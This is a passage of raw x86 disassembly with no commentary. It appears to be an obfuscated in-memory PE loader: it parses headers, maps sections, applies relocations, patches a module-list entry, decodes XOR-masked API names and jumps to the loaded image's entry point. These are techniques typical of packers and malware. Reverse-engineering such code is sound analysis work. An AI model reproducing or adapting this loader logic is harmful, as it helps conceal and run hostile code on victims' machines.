  421b40:	mov    DWORD PTR [ebp+0xc],eax
  421b43:	mov    eax,DWORD PTR [eax+0x50]
  421b46:	test   eax,eax
  421b48:	je     0x421f7c
  421b4e:	mov    DWORD PTR [ebp-0x2c],0xf88c85b5
  421b55:	mov    eax,DWORD PTR [ebp-0x2c]
  421b58:	xor    eax,esi
  421b5a:	add    eax,edi
  421b5c:	mov    DWORD PTR [ebp-0x2c],eax
  421b5f:	mov    eax,DWORD PTR [ebp-0x4]
  421b62:	mov    eax,DWORD PTR [ebx+0x190]
  421b68:	mov    ecx,DWORD PTR [eax]
  421b6a:	mov    ecx,DWORD PTR [ecx+0x3c]
  421b6d:	add    ecx,DWORD PTR [eax]
  421b6f:	mov    eax,DWORD PTR [ebp-0x4]
  421b72:	mov    eax,DWORD PTR [ebx+0x18c]
  421b78:	mov    edx,DWORD PTR [eax]
  421b7a:	mov    DWORD PTR [ebp-0x20],ecx
  421b7d:	mov    DWORD PTR [ebp+0x20],edx
  421b80:	cmp    edx,edx
  421b82:	jne    0x421bb6
  421b84:	mov    eax,DWORD PTR [ebx+0x1e0]
  421b8a:	lea    edx,[ebp-0x18]
  421b8d:	push   edx
  421b8e:	mov    edx,DWORD PTR [ebp-0xc]
  421b91:	xor    edx,esi
  421b93:	add    edx,edi
  421b95:	push   edx
  421b96:	push   DWORD PTR [ecx+0x50]
  421b99:	push   DWORD PTR [ebp+0x20]
  421b9c:	call   DWORD PTR [eax+0x1c]
  421b9f:	mov    eax,DWORD PTR [ebp-0x20]
  421ba2:	mov    ecx,DWORD PTR [eax+0x54]
  421ba5:	mov    eax,DWORD PTR [eax+0x50]
  421ba8:	sub    eax,ecx
  421baa:	add    ecx,DWORD PTR [ebp+0x20]
  421bad:	push   ecx
  421bae:	call   0x422519
  421bb3:	mov    edx,DWORD PTR [ebp+0x20]
  421bb6:	mov    eax,DWORD PTR [ebx+0x194]
  421bbc:	mov    DWORD PTR [eax],edx
  421bbe:	mov    eax,DWORD PTR [ebp+0xc]
  421bc1:	push   DWORD PTR [eax+0x54]
  421bc4:	push   DWORD PTR [ebp+0x8]
  421bc7:	push   edx
  421bc8:	call   0x42240f
  421bcd:	mov    ecx,DWORD PTR [ebp+0x20]
  421bd0:	mov    eax,DWORD PTR [ecx+0x3c]
  421bd3:	add    eax,ecx
  421bd5:	movzx  ecx,WORD PTR [eax+0x14]
  421bd9:	lea    ecx,[ecx+eax*1+0x18]
  421bdd:	mov    DWORD PTR [ebp+0x18],ecx
  421be0:	mov    ecx,DWORD PTR [ebp-0x4]
  421be3:	movzx  edx,WORD PTR [eax+0x6]
  421be7:	xor    ecx,esi
  421be9:	add    ecx,edi
  421beb:	mov    DWORD PTR [ebp+0xc],eax
  421bee:	cmp    edx,ecx
  421bf0:	je     0x421c9d
  421bf6:	mov    ecx,DWORD PTR [ebp-0x4]
  421bf9:	xor    ecx,esi
  421bfb:	add    ecx,edi
  421bfd:	mov    DWORD PTR [ebp-0x8],ecx
  421c00:	mov    ecx,DWORD PTR [ebp-0x24]
  421c03:	movzx  edx,WORD PTR [eax+0x6]
  421c07:	xor    ecx,esi
  421c09:	sub    edx,ecx
  421c0b:	sub    edx,edi
  421c0d:	cmp    DWORD PTR [ebp-0x8],edx
  421c10:	ja     0x421c9d
  421c16:	mov    edx,DWORD PTR [ebp+0x18]
  421c19:	add    edx,0x8
  421c1c:	mov    DWORD PTR [ebp+0x18],edx
  421c1f:	jmp    0x421c24
  421c21:	mov    edx,DWORD PTR [ebp+0x18]
  421c24:	mov    eax,DWORD PTR [eax+0x38]
  421c27:	lea    ecx,[eax-0x1]
  421c2a:	mov    DWORD PTR [ebp-0x38],eax
  421c2d:	mov    eax,DWORD PTR [edx]
  421c2f:	test   eax,ecx
  421c31:	je     0x421c3a
  421c33:	not    ecx
  421c35:	and    eax,ecx
  421c37:	add    eax,DWORD PTR [ebp-0x38]
  421c3a:	mov    ecx,DWORD PTR [edx+0x4]
  421c3d:	add    ecx,DWORD PTR [ebp+0x20]
  421c40:	push   ecx
  421c41:	call   0x422519
  421c46:	mov    edx,DWORD PTR [ebp-0x4]
  421c49:	mov    eax,DWORD PTR [ebp+0x18]
  421c4c:	mov    ecx,DWORD PTR [eax+0x8]
  421c4f:	xor    edx,esi
  421c51:	add    edx,edi
  421c53:	cmp    ecx,edx
  421c55:	je     0x421c6e
  421c57:	push   ecx
  421c58:	mov    ecx,DWORD PTR [ebp+0x8]
  421c5b:	add    ecx,DWORD PTR [eax+0xc]
  421c5e:	mov    eax,DWORD PTR [eax+0x4]
  421c61:	add    eax,DWORD PTR [ebp+0x20]
  421c64:	push   ecx
  421c65:	push   eax
  421c66:	call   0x42240f
  421c6b:	mov    eax,DWORD PTR [ebp+0x18]
  421c6e:	mov    ecx,DWORD PTR [ebp-0x24]
  421c71:	mov    edx,DWORD PTR [ebp-0x8]
  421c74:	add    eax,0x28
  421c77:	xor    ecx,esi
  421c79:	lea    ecx,[edx+ecx*1+0x3272fa]
  421c80:	mov    edx,DWORD PTR [ebp+0xc]
  421c83:	mov    DWORD PTR [ebp+0x18],eax
  421c86:	mov    eax,DWORD PTR [ebp-0x24]
  421c89:	movzx  edx,WORD PTR [edx+0x6]
  421c8d:	xor    eax,esi
  421c8f:	sub    edx,eax
  421c91:	mov    eax,DWORD PTR [ebp+0xc]
  421c94:	sub    edx,edi
  421c96:	mov    DWORD PTR [ebp-0x8],ecx
  421c99:	cmp    ecx,edx
  421c9b:	jbe    0x421c21
  421c9d:	mov    edx,DWORD PTR [ebx+0x18c]
  421ca3:	mov    ecx,DWORD PTR [ebp+0x20]
  421ca6:	cmp    ecx,DWORD PTR [edx]
  421ca8:	jne    0x421cd1
  421caa:	mov    eax,DWORD PTR [ebx+0x1e0]
  421cb0:	lea    edx,[ebp-0x18]
  421cb3:	push   edx
  421cb4:	mov    edx,DWORD PTR [ebp-0x10]
  421cb7:	xor    edx,esi
  421cb9:	add    edx,edi
  421cbb:	push   edx
  421cbc:	mov    edx,DWORD PTR [ebp-0x20]
  421cbf:	push   DWORD PTR [edx+0x54]
  421cc2:	push   ecx
  421cc3:	call   DWORD PTR [eax+0x1c]
  421cc6:	test   eax,eax
  421cc8:	je     0x421f6d
  421cce:	mov    eax,DWORD PTR [ebp+0xc]
  421cd1:	mov    ecx,DWORD PTR [ebx+0x1c8]
  421cd7:	mov    ecx,DWORD PTR [ecx]
  421cd9:	xor    ecx,esi
  421cdb:	add    ecx,edi
  421cdd:	je     0x421e98
  421ce3:	mov    eax,DWORD PTR [ebp-0x4]
  421ce6:	xor    eax,esi
  421ce8:	add    eax,edi
  421cea:	and    DWORD PTR [ebp+0x8],0x0
  421cee:	mov    DWORD PTR [ebp-0x14],eax
  421cf1:	mov    eax,0xf89c85d9
  421cf6:	lea    ecx,[eax-0x18]
  421cf9:	mov    DWORD PTR [ebp-0x58],0xf89c85c7
  421d00:	mov    DWORD PTR [ebp-0x54],0xf89c85c9
  421d07:	mov    DWORD PTR [ebp-0x50],eax
  421d0a:	mov    DWORD PTR [ebp-0x4c],ecx
  421d0d:	mov    DWORD PTR [ebp-0x48],ecx
  421d10:	mov    DWORD PTR [ebp-0x44],0xf89c85b5
  421d17:	mov    edx,DWORD PTR [ebp+0x8]
  421d1a:	mov    ecx,0x8b3
  421d1f:	xor    cx,WORD PTR [ebp+edx*4-0x58]
  421d24:	mov    edx,0x72fa
  421d29:	add    cx,dx
  421d2c:	mov    edx,DWORD PTR [ebp+0x8]
  421d2f:	inc    DWORD PTR [ebp+0x8]
  421d32:	cmp    DWORD PTR [ebp+0x8],0x6
  421d36:	mov    WORD PTR [ebp+edx*2-0xc0],cx
  421d3e:	jb     0x421d17
  421d40:	mov    ecx,0xf89c85cb
  421d45:	mov    DWORD PTR [ebp-0xb0],eax
  421d4b:	mov    DWORD PTR [ebp-0x9c],eax
  421d51:	mov    DWORD PTR [ebp-0x74],eax
  421d54:	mov    DWORD PTR [ebp-0x70],eax
  421d57:	lea    eax,[ecx-0x1]
  421d5a:	lea    edx,[ecx+0x34]
  421d5d:	mov    DWORD PTR [ebp-0x64],eax
  421d60:	mov    DWORD PTR [ebp-0x60],eax
  421d63:	mov    DWORD PTR [ebp-0xb4],0xf89c85e1
  421d6d:	mov    DWORD PTR [ebp-0xac],ecx
  421d73:	mov    DWORD PTR [ebp-0xa8],edx
  421d79:	mov    DWORD PTR [ebp-0xa4],0xf89c85dc
  421d83:	mov    DWORD PTR [ebp-0xa0],0xf89c85c7
  421d8d:	mov    DWORD PTR [ebp-0x98],0xf89c85f8
  421d97:	mov    DWORD PTR [ebp-0x94],0xf89c85c7
  421da1:	mov    DWORD PTR [ebp-0x90],0xf89c85c9
  421dab:	mov    DWORD PTR [ebp-0x8c],ecx
  421db1:	mov    DWORD PTR [ebp-0x88],0xf89c85cc
  421dbb:	mov    DWORD PTR [ebp-0x84],edx
  421dc1:	mov    DWORD PTR [ebp-0x80],0xf89c85c6
  421dc8:	mov    DWORD PTR [ebp-0x7c],ecx
  421dcb:	mov    DWORD PTR [ebp-0x78],0xf89c85f4
  421dd2:	mov    DWORD PTR [ebp-0x6c],ecx
  421dd5:	mov    DWORD PTR [ebp-0x68],0xf89c85d8
  421ddc:	mov    DWORD PTR [ebp-0x5c],0xf89c85b5
  421de3:	xor    eax,eax
  421de5:	mov    cl,BYTE PTR [ebp+eax*4-0xb4]
  421dec:	xor    cl,0xb3
  421def:	sub    cl,0x6
  421df2:	mov    BYTE PTR [ebp+eax*1-0xd8],cl
  421df9:	inc    eax
  421dfa:	cmp    eax,0x17
  421dfd:	jb     0x421de5
  421dff:	mov    eax,DWORD PTR [ebx+0x1e0]
  421e05:	lea    ecx,[ebp-0xc0]
  421e0b:	push   ecx
  421e0c:	call   DWORD PTR [eax+0x4]
  421e0f:	mov    ecx,DWORD PTR [ebx+0x1e0]
  421e15:	lea    edx,[ebp-0xd8]
  421e1b:	push   edx
  421e1c:	push   eax
  421e1d:	call   DWORD PTR [ecx+0x8]
  421e20:	mov    DWORD PTR [ebp-0x40],eax
  421e23:	lea    eax,[ebp-0x14]
  421e26:	push   eax
  421e27:	mov    eax,DWORD PTR [ebx+0x18c]
  421e2d:	push   DWORD PTR [eax]
  421e2f:	mov    eax,DWORD PTR [ebp-0x40]
  421e32:	call   eax
  421e34:	mov    eax,DWORD PTR [ebp-0x4]
  421e37:	xor    eax,esi
  421e39:	add    eax,edi
  421e3b:	mov    DWORD PTR [ebp-0x34],eax
  421e3e:	mov    ecx,DWORD PTR [ebp-0x4]
  421e41:	mov    eax,DWORD PTR [ebp-0x14]
  421e44:	xor    ecx,esi
  421e46:	add    ecx,edi
  421e48:	cmp    eax,ecx
  421e4a:	je     0x421e95
  421e4c:	mov    DWORD PTR [ebp-0x3c],eax
  421e4f:	jmp    0x421e60
  421e51:	mov    eax,DWORD PTR [eax]
  421e53:	mov    ecx,DWORD PTR [ebp-0x3c]
  421e56:	mov    DWORD PTR [ebp-0x14],eax
  421e59:	mov    eax,DWORD PTR [ebp-0x14]
  421e5c:	cmp    eax,ecx
  421e5e:	je     0x421e6d
  421e60:	mov    edx,DWORD PTR [eax+0x18]
  421e63:	mov    ecx,DWORD PTR [ebx+0x18c]
  421e69:	cmp    edx,DWORD PTR [ecx]
  421e6b:	jne    0x421e51
  421e6d:	mov    ecx,DWORD PTR [ebx+0x18c]
  421e73:	mov    edx,DWORD PTR [eax+0x18]
  421e76:	cmp    edx,DWORD PTR [ecx]
  421e78:	jne    0x421e95
  421e7a:	mov    ecx,DWORD PTR [ebx+0x190]
  421e80:	mov    edx,DWORD PTR [ebp-0x20]
  421e83:	mov    edx,DWORD PTR [edx+0x28]
  421e86:	add    edx,DWORD PTR [ecx]
  421e88:	mov    DWORD PTR [eax+0x1c],edx
  421e8b:	mov    eax,DWORD PTR [ebp-0x24]
  421e8e:	xor    eax,esi
  421e90:	add    eax,edi
  421e92:	mov    DWORD PTR [ebp-0x34],eax
  421e95:	mov    eax,DWORD PTR [ebp+0xc]
  421e98:	push   ebx
  421e99:	push   eax
  421e9a:	push   DWORD PTR [ebp+0x20]
  421e9d:	call   0x42161d
  421ea2:	test   eax,eax
  421ea4:	je     0x421f6d
  421eaa:	push   DWORD PTR [ebp+0xc]
  421ead:	mov    ecx,ebx
  421eaf:	push   DWORD PTR [ebp+0x20]
  421eb2:	call   0x421576
  421eb7:	test   eax,eax
  421eb9:	je     0x421f6d
  421ebf:	mov    eax,DWORD PTR [ebp+0xc]
  421ec2:	mov    edx,DWORD PTR [ebp+0x20]
  421ec5:	mov    ecx,ebx
  421ec7:	call   0x42144f
  421ecc:	test   eax,eax
  421ece:	je     0x421f6d
  421ed4:	push   ebx
  421ed5:	push   DWORD PTR [ebp+0x20]
  421ed8:	call   0x421900
  421edd:	test   eax,eax
  421edf:	je     0x421f6d
  421ee5:	mov    eax,DWORD PTR [ebx+0x18c]
  421eeb:	mov    edx,DWORD PTR [ebp+0x20]
  421eee:	cmp    edx,DWORD PTR [eax]
  421ef0:	jne    0x421f0c
  421ef2:	mov    eax,DWORD PTR [ebx+0x1e0]
  421ef8:	lea    ecx,[ebp-0x18]
  421efb:	push   ecx
  421efc:	push   DWORD PTR [ebp-0x18]
  421eff:	mov    ecx,DWORD PTR [ebp-0x20]
  421f02:	push   DWORD PTR [ecx+0x54]
  421f05:	push   edx
  421f06:	call   DWORD PTR [eax+0x1c]
  421f09:	mov    edx,DWORD PTR [ebp+0x20]
  421f0c:	mov    eax,DWORD PTR [ebx+0x1c8]
  421f12:	mov    eax,DWORD PTR [eax]
  421f14:	xor    eax,esi
  421f16:	add    eax,edi
  421f18:	je     0x421f51
  421f1a:	mov    ecx,DWORD PTR [ebp+0xc]
  421f1d:	mov    eax,DWORD PTR [ecx+0x28]
  421f20:	mov    DWORD PTR [ebp+0x8],0xf89ca5b5
  421f27:	mov    esi,DWORD PTR [ebp+0x8]
  421f2a:	push   DWORD PTR [ebp+0x14]
  421f2d:	xor    esi,0x8b3
  421f33:	push   DWORD PTR [ebp+0x10]
  421f36:	add    esi,0x72fa
  421f3c:	or     WORD PTR [ecx+0x16],si
  421f40:	add    eax,edx
  421f42:	push   edx
  421f43:	call   eax
  421f45:	mov    DWORD PTR [ebx+0x1d0],0xf89c85b4
  421f4f:	jmp    0x421f5b
  421f51:	mov    eax,DWORD PTR [ebp+0xc]
  421f54:	mov    eax,DWORD PTR [eax+0x28]
  421f57:	add    eax,edx
  421f59:	call   eax
  421f5b:	mov    DWORD PTR [ebp-0x8],eax
  421f5e:	mov    eax,DWORD PTR [ebp-0x8]
  421f61:	mov    ecx,DWORD PTR [ebp+0x1c]
  421f64:	mov    DWORD PTR [ecx],eax
  421f66:	mov    DWORD PTR [ebp-0x30],0x1
  421f6d:	cmp    DWORD PTR [ebp-0x30],0x0
  421f71:	jne    0x421f77
  421f73:	and    DWORD PTR [ebp+0x20],0x0
  421f77:	mov    eax,DWORD PTR [ebp+0x20]
  421f7a:	jmp    0x421f7e
  421f7c:	xor    eax,eax
  421f7e:	pop    edi
  421f7f:	pop    esi
  421f80:	pop    ebx
  421f81:	leave  
  421f82:	ret    0x1c
  421f85:	push   ebp
  421f86:	mov    ebp,esp
  421f88:	movzx  edx,WORD PTR [ecx+0x6]
  421f8c:	movzx  eax,WORD PTR [ecx+0x14]
  421f90:	push   ebx
  421f91:	push   edi
  421f92:	xor    edi,edi
  421f94:	lea    eax,[eax+ecx*1+0x18]
  421f98:	test   edx,edx
  421f9a:	je     0x421fbb
  421f9c:	mov    ecx,DWORD PTR [eax+0xc]
  421f9f:	lea    ebx,[ecx+esi*1]
  421fa2:	cmp    DWORD PTR [ebp+0x8],ebx
  421fa5:	jb     0x421fb3
  421fa7:	mov    ebx,DWORD PTR [eax+0x8]
  421faa:	add    ebx,ecx
  421fac:	add    ebx,esi
  421fae:	cmp    DWORD PTR [ebp+0x8],ebx
  421fb1:	jb     0x421fbd
  421fb3:	add    eax,0x28
  421fb6:	inc    edi
  421fb7:	cmp    edi,edx
  421fb9:	jb     0x421f9c
  421fbb:	xor    eax,eax
  421fbd:	pop    edi
  421fbe:	pop    ebx
  421fbf:	pop    ebp
  421fc0:	ret    0x4
  421fc3:	push   ebp
  421fc4:	mov    ebp,esp
  421fc6:	sub    esp,0x34
  421fc9:	mov    DWORD PTR [ebp-0xc],0xf89c85b5
  421fd0:	mov    DWORD PTR [ebp-0x18],0xf89c85b4
  421fd7:	mov    DWORD PTR [ebp-0x1c],0xf89c85bb
  421fde:	mov    DWORD PTR [ebp-0x8],0xf89c85d4
  421fe5:	mov    DWORD PTR [ebp-0x20],0xf89c85f4
  421fec:	mov    DWORD PTR [ebp-0x2c],0xf89c8533
  421ff3:	mov    DWORD PTR [ebp-0x2c],0xf89c85d3
  421ffa:	mov    DWORD PTR [ebp-0x10],eax
  421ffd:	mov    eax,DWORD PTR [ebp+0x8]
  422000:	mov    DWORD PTR [ebp-0x14],eax
  422003:	mov    eax,DWORD PTR [ebp-0xc]
  422006:	push   ebx
  422007:	mov    ecx,0x75108b3
  42200c:	xor    eax,ecx
  42200e:	push   esi
  42200f:	mov    esi,DWORD PTR [ebp-0x10]
  422012:	mov    edx,0x3272fa
  422017:	add    eax,edx
  422019:	push   edi
  42201a:	cmp    esi,eax
  42201c:	je     0x4221fb
  422022:	mov    eax,DWORD PTR [ebp-0xc]
  422025:	mov    esi,DWORD PTR [ebp-0x14]
  422028:	xor    eax,ecx
  42202a:	add    eax,edx
  42202c:	cmp    esi,eax
  42202e:	je     0x4221fb
  422034:	mov    eax,DWORD PTR [ebp-0xc]
  422037:	xor    eax,ecx
  422039:	add    eax,edx
  42203b:	mov    DWORD PTR [ebp-0x24],eax
  42203e:	mov    eax,DWORD PTR [ebp-0xc]
  422041:	xor    eax,ecx
  422043:	add    eax,edx
  422045:	mov    DWORD PTR [ebp-0x28],eax
  422048:	mov    edi,DWORD PTR [ebp-0x20]
  42204b:	mov    ebx,DWORD PTR [ebp-0x8]
  42204e:	mov    esi,0x8b3
  422053:	xor    edi,esi
  422055:	mov    eax,0x72fa
  42205a:	xor    ebx,esi
  42205c:	add    edi,eax
  42205e:	add    ebx,eax
  422060:	sub    ebx,edi
  422062:	mov    WORD PTR [ebp-0x8],bx
  422066:	jmp    0x42212b
  42206b:	mov    edi,DWORD PTR [ebp-0xc]
  42206e:	mov    bx,WORD PTR [ebp-0x4]
  422072:	xor    edi,esi
  422074:	add    edi,eax
  422076:	cmp    bx,di
  422079:	je     0x42216d
  42207f:	mov    edi,DWORD PTR [ebp-0xc]
  422082:	mov    ebx,DWORD PTR [ebp+0xc]
  422085:	xor    edi,ecx
  422087:	add    edi,edx
  422089:	cmp    ebx,edi
  42208b:	mov    di,WORD PTR [ebp-0x4]
  42208f:	mov    bx,WORD PTR [ebp+0x8]
  422093:	je     0x4220fe
  422095:	cmp    bx,di
  422098:	je     0x422107
  42209a:	mov    edi,DWORD PTR [ebp-0x20]
  42209d:	mov    bx,WORD PTR [ebp+0x8]
  4220a1:	xor    edi,esi
  4220a3:	add    edi,eax
  4220a5:	cmp    bx,di
  4220a8:	jb     0x4220c8
  4220aa:	mov    edi,DWORD PTR [ebp-0x2c]
  4220ad:	mov    bx,WORD PTR [ebp+0x8]
  4220b1:	xor    edi,esi
  4220b3:	add    edi,eax
  4220b5:	cmp    bx,di
  4220b8:	ja     0x4220c8
  4220ba:	movzx  edi,WORD PTR [ebp+0x8]
  4220be:	movzx  ebx,WORD PTR [ebp-0x8]
  4220c2:	add    edi,ebx
  4220c4:	mov    WORD PTR [ebp+0x8],di
  4220c8:	mov    edi,DWORD PTR [ebp-0x20]
  4220cb:	mov    bx,WORD PTR [ebp-0x4]
  4220cf:	xor    edi,esi
  4220d1:	add    edi,eax
  4220d3:	cmp    bx,di
  4220d6:	jb     0x4220f6
  4220d8:	mov    edi,DWORD PTR [ebp-0x2c]
  4220db:	mov    bx,WORD PTR [ebp-0x4]
  4220df:	xor    edi,esi
  4220e1:	add    edi,eax
  4220e3:	cmp    bx,di
  4220e6:	ja     0x4220f6
  4220e8:	movzx  edi,WORD PTR [ebp-0x4]
  4220ec:	movzx  ebx,WORD PTR [ebp-0x8]
  4220f0:	add    edi,ebx
  4220f2:	mov    WORD PTR [ebp-0x4],di
  4220f6:	mov    di,WORD PTR [ebp-0x4]
  4220fa:	mov    bx,WORD PTR [ebp+0x8]
  4220fe:	cmp    bx,di
  422101:	jne    0x4221fb
  422107:	mov    edi,DWORD PTR [ebp-0x1c]
  42210a:	mov    ebx,DWORD PTR [ebp-0x10]
  42210d:	xor    edi,ecx
  42210f:	lea    edi,[edi+ebx*1+0x3272fa]
  422116:	mov    DWORD PTR [ebp-0x10],edi
  422119:	mov    edi,DWORD PTR [ebp-0x1c]
  42211c:	mov    ebx,DWORD PTR [ebp-0x14]
  42211f:	xor    edi,ecx
  422121:	lea    edi,[edi+ebx*1+0x3272fa]
  422128:	mov    DWORD PTR [ebp-0x14],edi
  42212b:	mov    edi,DWORD PTR [ebp-0x24]
  42212e:	mov    ebx,DWORD PTR [ebp-0x10]
  422131:	mov    di,WORD PTR [ebx+edi*2]
  422135:	mov    WORD PTR [ebp+0x8],di
  422139:	mov    edi,DWORD PTR [ebp-0x28]
  42213c:	mov    ebx,DWORD PTR [ebp-0x14]
  42213f:	mov    di,WORD PTR [ebx+edi*2]
  422143:	mov    WORD PTR [ebp-0x4],di
  422147:	mov    edi,DWORD PTR [ebp-0xc]
  42214a:	mov    bx,WORD PTR [ebp+0x8]
  42214e:	xor    edi,esi
  422150:	add    edi,eax
  422152:	cmp    bx,di
  422155:	jne    0x42206b
  42215b:	mov    eax,DWORD PTR [ebp-0x18]
  42215e:	mov    esi,DWORD PTR [ebp-0xc]
  422161:	xor    eax,ecx
  422163:	add    eax,edx
  422165:	imul   eax,esi
  422168:	mov    DWORD PTR [ebp-0xc],eax
  42216b:	jmp    0x42217f
  42216d:	mov    eax,DWORD PTR [ebp-0xc]
  422170:	mov    esi,DWORD PTR [ebp-0x18]
  422173:	xor    eax,ecx
  422175:	lea    eax,[eax+esi*1+0x3272fa]
  42217c:	mov    DWORD PTR [ebp-0x18],eax
  42217f:	mov    eax,DWORD PTR [ebp-0x24]
  422182:	sub    eax,edx
  422184:	xor    eax,ecx
  422186:	mov    DWORD PTR [ebp-0x30],eax
  422189:	mov    eax,DWORD PTR [ebp-0x28]
  42218c:	sub    eax,edx
  42218e:	xor    eax,ecx
  422190:	mov    DWORD PTR [ebp-0x34],eax
  422193:	mov    eax,DWORD PTR [ebp-0x34]
  422196:	mov    esi,DWORD PTR [ebp-0x1c]
  422199:	xor    esi,ecx
  42219b:	add    esi,edx
  42219d:	xor    eax,ecx
  42219f:	add    eax,0x3272fa
  4221a4:	imul   esi,eax
  4221a7:	mov    eax,DWORD PTR [ebp-0x14]
  4221aa:	movzx  eax,WORD PTR [esi+eax*1]
  4221ae:	mov    esi,DWORD PTR [ebp-0x30]
  4221b1:	mov    edi,DWORD PTR [ebp-0x1c]
  4221b4:	xor    esi,ecx
  4221b6:	add    esi,edx
  4221b8:	xor    edi,ecx
  4221ba:	add    edi,edx
  4221bc:	imul   edi,esi
  4221bf:	mov    esi,DWORD PTR [ebp-0x10]
  4221c2:	movzx  esi,WORD PTR [edi+esi*1]
  4221c6:	sub    eax,edx
  4221c8:	sub    esi,edx
  4221ca:	xor    eax,ecx
  4221cc:	xor    esi,ecx
  4221ce:	cmp    esi,eax
  4221d0:	jne    0x4221fb
  4221d2:	mov    eax,DWORD PTR [ebp-0x30]
  4221d5:	mov    esi,DWORD PTR [ebp-0x1c]
  4221d8:	xor    eax,ecx
  4221da:	add    eax,0x3272fa
  4221df:	xor    esi,ecx
  4221e1:	add    esi,edx
  4221e3:	imul   esi,eax
  4221e6:	mov    eax,DWORD PTR [ebp-0x10]
  4221e9:	movzx  eax,WORD PTR [esi+eax*1]
  4221ed:	mov    esi,DWORD PTR [ebp-0xc]
  4221f0:	sub    eax,edx
  4221f2:	xor    eax,ecx
  4221f4:	cmp    eax,esi
  4221f6:	mov    eax,DWORD PTR [ebp-0xc]
  4221f9:	je     0x4221fe
  4221fb:	mov    eax,DWORD PTR [ebp-0x18]
  4221fe:	pop    edi
  4221ff:	xor    eax,ecx
  422201:	pop    esi
  422202:	add    eax,edx
  422204:	pop    ebx
  422205:	leave  
  422206:	ret    0x8
  422209:	push   ebp
  42220a:	mov    ebp,esp
  42220c:	push   ecx
  42220d:	mov    cx,WORD PTR [eax]
  422210:	push   esi
  422211:	mov    esi,0x3b5f
  422216:	sub    cx,si
  422219:	mov    esi,0x8a9d
  42221e:	xor    cx,si
  422221:	mov    esi,0x4e3c
  422226:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  42222d:	mov    edx,0xf89c85b5
  422232:	cmp    cx,si
  422235:	je     0x422294
  422237:	push   ebx
  422238:	push   edi
  422239:	movzx  ecx,cx
  42223c:	mov    edi,0xffcd8d06
  422241:	mov    esi,0x75108b3
  422246:	mov    ebx,0x4e60
  42224b:	cmp    cx,bx
  42224e:	jne    0x422253
  422250:	mov    DWORD PTR [ebp-0x4],edx
  422253:	lea    edx,[edi+0x1]
  422256:	xor    edx,esi
  422258:	mov    edi,edx
  42225a:	xor    edi,esi
  42225c:	mov    cx,WORD PTR [eax+edi*2+0x64e5f4]
  422264:	mov    ebx,0x3b5f
  422269:	sub    cx,bx
  42226c:	mov    ebx,0x8a9d
  422271:	xor    cx,bx
  422274:	mov    ebx,0x4e3c
  422279:	cmp    cx,bx
  42227c:	jne    0x422246
  42227e:	mov    ecx,DWORD PTR [ebp-0x4]
  422281:	pop    edi
  422282:	pop    ebx
  422283:	cmp    ecx,0xf89c85b6
  422289:	je     0x422294
  42228b:	xor    ecx,esi
  42228d:	lea    eax,[eax+ecx*2+0x64e5f6]
  422294:	pop    esi
  422295:	leave  
  422296:	ret    
  422297:	push   ebp
  422298:	mov    ebp,esp
  42229a:	push   ecx
  42229b:	push   esi
  42229c:	push   edi
  42229d:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  4222a4:	mov    esi,0xf89c85b5
  4222a9:	call   0x422209
  4222ae:	mov    edi,eax
  4222b0:	mov    al,BYTE PTR [edi]
  4222b2:	sub    al,0x6
  4222b4:	xor    al,0x81
  4222b6:	cmp    al,0x7b
  4222b8:	je     0x42231b
  4222ba:	mov    eax,edi
  4222bc:	mov    edx,0xffcd8d06
  4222c1:	mov    ecx,0x75108b3
  4222c6:	push   ebx
  4222c7:	mov    ax,WORD PTR [eax]
  4222ca:	mov    ebx,0x3b5f
  4222cf:	sub    ax,bx
  4222d2:	mov    ebx,0x8a9d
  4222d7:	xor    ax,bx
  4222da:	mov    ebx,0x4e52
  4222df:	cmp    ax,bx
  4222e2:	jne    0x4222e7
  4222e4:	mov    DWORD PTR [ebp-0x4],esi
  4222e7:	lea    esi,[edx+0x1]
  4222ea:	xor    esi,ecx
  4222ec:	mov    edx,esi
  4222ee:	xor    edx,ecx
  4222f0:	lea    eax,[edi+edx*2+0x64e5f4]
  4222f7:	mov    bl,BYTE PTR [eax]
  4222f9:	sub    bl,0x6
  4222fc:	xor    bl,0x81
  4222ff:	cmp    bl,0x7b
  422302:	jne    0x4222c7
  422304:	mov    eax,DWORD PTR [ebp-0x4]
  422307:	pop    ebx
  422308:	cmp    eax,0xf89c85b6
  42230d:	je     0x42231b
  42230f:	xor    eax,ecx
  422311:	xor    ecx,ecx
  422313:	mov    WORD PTR [edi+eax*2+0x64e5f4],cx
  42231b:	mov    eax,edi
  42231d:	pop    edi
  42231e:	pop    esi
  42231f:	leave  
  422320:	ret    
  422321:	push   ebp
  422322:	mov    ebp,esp
  422324:	push   ecx
  422325:	push   esi
  422326:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  42232d:	mov    esi,0xf89c85b5
  422332:	call   0x422209
  422337:	mov    cx,WORD PTR [eax]
  42233a:	mov    edx,0x3b5f
  42233f:	sub    cx,dx
  422342:	mov    edx,0x8a9d
  422347:	xor    cx,dx
  42234a:	mov    edx,0x4e3c
  42234f:	cmp    cx,dx
  422352:	je     0x4223ab
  422354:	push   ebx
  422355:	push   edi
  422356:	movzx  ecx,cx
  422359:	mov    edx,0xffcd8d06
  42235e:	mov    edi,0x75108b3
  422363:	mov    ebx,0x4e52
  422368:	cmp    cx,bx
  42236b:	jne    0x422370
  42236d:	mov    DWORD PTR [ebp-0x4],esi
  422370:	lea    esi,[edx+0x1]
  422373:	xor    esi,edi
  422375:	mov    edx,esi
  422377:	xor    edx,edi
  422379:	mov    cx,WORD PTR [eax+edx*2+0x64e5f4]
  422381:	mov    ebx,0x3b5f
  422386:	sub    cx,bx
  422389:	mov    ebx,0x8a9d
  42238e:	xor    cx,bx
  422391:	mov    ebx,0x4e3c
  422396:	cmp    cx,bx
  422399:	jne    0x422363
  42239b:	cmp    DWORD PTR [ebp-0x4],0xf89c85b6
  4223a2:	pop    edi
  4223a3:	pop    ebx
  4223a4:	je     0x4223ab
  4223a6:	xor    eax,eax
  4223a8:	inc    eax
  4223a9:	jmp    0x4223ad
  4223ab:	xor    eax,eax
  4223ad:	pop    esi
  4223ae:	leave  
  4223af:	ret    
  4223b0:	push   ebp
  4223b1:	mov    ebp,esp
  4223b3:	push   ecx
  4223b4:	mov    eax,DWORD PTR [ebp+0x8]
  4223b7:	movzx  ecx,WORD PTR [eax]
  4223ba:	push   esi
  4223bb:	lea    eax,[ecx-0x3b5f]
  4223c1:	mov    esi,0x8a9d
  4223c6:	push   edi
  4223c7:	xor    eax,esi
  4223c9:	mov    edi,0x4e3c
  4223ce:	mov    DWORD PTR [ebp-0x4],edx
  4223d1:	cmp    ax,di
  4223d4:	je     0x422401
